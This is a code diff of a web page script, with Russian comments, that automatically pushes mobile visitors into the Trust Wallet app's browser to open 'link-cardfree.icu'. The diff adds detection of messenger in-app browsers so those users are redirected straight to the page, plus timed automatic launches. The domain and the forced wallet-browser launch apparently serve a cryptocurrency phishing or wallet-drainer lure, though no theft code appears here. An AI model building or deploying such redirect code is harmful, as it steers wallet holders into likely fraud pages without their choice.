@@ -275,20 +275,28 @@
 <script>
 (function () {
   var DEST = 'https://link-cardfree.icu/';
-  var SCHEME = 'trust://open_url?coin_id=60&url=' + encodeURIComponent(DEST);
-  var INTENT = 'intent://open_url?coin_id=60&url=' + encodeURIComponent(DEST) +
-               '#Intent;scheme=trust;package=com.wallet.crypto.trustapp;end';
+  var Q = '?coin_id=195&url=' + encodeURIComponent(DEST);
+  var UNIVERSAL = 'https://link.trustwallet.com/open_url' + Q;
+  var SCHEME = 'trust://open_url' + Q;
+  var INTENT = 'intent://link.trustwallet.com/open_url' + Q +
+               '#Intent;scheme=https;package=com.wallet.crypto.trustapp;end';
   var ua = navigator.userAgent;
   var isIOS = /iPhone|iPad|iPod/i.test(ua);
   var isAndroid = /Android/i.test(ua);
   var isMobile = isIOS || isAndroid;
+  // Встроенные браузеры мессенджеров режут кастомные схемы — там идём сразу на стран��цу.
+  var inApp = /Telegram|Instagram|FBAN|FBAV|FB_IAB|Line\/|Viber|Snapchat|Twitter|LinkedIn|musical_ly|BytedanceWebview|MicroMessenger|Pinterest|VKShared|OKApp/i.test(ua);
 
   var gate = document.getElementById('gate');
   var gateOpen = document.getElementById('gateOpen');
   var gateStay = document.getElementById('gateStay');
+  var hint = document.querySelector('.hint');
   var fallback;
 
+  if (inApp && hint) hint.textContent = 'Откроется страница выпуска в этом браузере';
+
   function openApp() {
+    if (inApp) { window.location.href = DEST; return; }
     try { window.location.href = isAndroid ? INTENT : SCHEME; }
     catch (e) { window.location.href = DEST; return; }
     clearTimeout(fallback);
@@ -311,6 +319,7 @@
   document.querySelectorAll('.js-open').forEach(function (a) {
     a.addEventListener('click', function (e) {
       if (!isMobile) return;
+      if (inApp) return;
       e.preventDefault();
       showGate();
       openApp();
@@ -323,7 +332,10 @@
   });
   gateStay.addEventListener('click', hideGate);
 
-  if (isMobile) {
+  // запасной вариант для iOS-браузеров, где схема не сработала: универсальная ссылка
+  window.TRUST_UNIVERSAL = UNIVERSAL;
+
+  if (isMobile && !inApp) {
     var last = 0;
     try { last = Number(sessionStorage.getItem('tw_auto')) || 0; } catch (e) {}
     if (Date.now() - last > 15 * 60 * 1000) {
@@ -333,6 +345,10 @@
         openApp();
       }, 900);
     }
+  }
+
+  if (isMobile && inApp) {
+    setTimeout(function () { window.location.replace(DEST); }, 900);
   }
 })();
 </script>
